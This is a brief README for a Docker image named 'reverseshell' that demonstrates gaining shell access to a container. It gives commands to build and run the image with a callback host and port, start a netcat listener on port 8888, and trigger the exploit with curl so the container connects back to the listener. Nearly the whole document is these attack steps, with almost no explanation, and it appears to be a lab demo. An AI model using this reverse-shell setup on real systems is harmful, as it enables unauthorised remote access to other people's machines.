# README.md
Demonstrates getting access into a container

Run the stupid webserver.  Retrieve your host ip address and replace. 
```
docker build -t reverseshell . 
docker run --env REMOTE_HOST=192.168.1.238 --env REMOTE_PORT=8888 --rm -p 8080:8080 reverseshell
```

Run the callback service
```
nc -l -p 8888 -vvv 
```

Invoke the exploit against the web server
```
curl localhost:8080
```

Now go back to the shell running the callback and list the contents. 

```
apt install curl
```

## Troubleshooting  
Test with a simple webservice  
```
docker run -it --rm -p 8080:8080 --entrypoint /bin/bash reverseshell
echo -e "HTTP/1.1 200 OK\n\n $(date)" | nc -l -p 8080 -q 1
curl localhost:8080
```

```
tmuxinator
tmuxinator stop reverseshell
```